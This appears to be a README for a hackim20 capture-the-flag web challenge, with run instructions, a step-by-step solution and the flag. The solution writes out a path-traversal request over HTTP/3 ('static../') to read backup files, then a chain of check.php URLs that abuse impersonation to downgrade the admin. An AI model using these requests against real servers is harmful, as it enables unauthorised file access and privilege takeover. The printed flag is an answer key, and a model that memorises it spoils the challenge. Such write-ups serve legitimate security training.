## Run

1. Should set `server.crt` and `server.key` in `docker-compose.yml` properly
2. ./start.sh

## Solution

1. Build curl with http3 - https://github.com/curl/curl/blob/master/docs/HTTP3.md
2. Lfi to get backup files - ./curl --http3 https://localhost:8443/static../
3. You will find the Docs in backup dir. ./curl --http3 https://localhost:8443/static../backup/links.txt
4. Perform a downgrade attack on the admin

```
Create a user
http://192.168.29.182:3000/check.php?signup=true&name=asd
Downgrade admin to user
http://192.168.29.182:3000/check.php?impersonator=asd-admin&impersonatee=asd
impersonate user to admin
http://192.168.29.182:3000/check.php?impersonator=asd&impersonatee=asd-admin
Make the admin umimpersonate
http://192.168.29.182:3000/check.php?unimpersonate=asd-admin
Get the flag
http://192.168.29.182:3000/check.php?status=asd
```


## Flag
hackim20{We_Never_Thought_it_Was_That_Vulnerable}
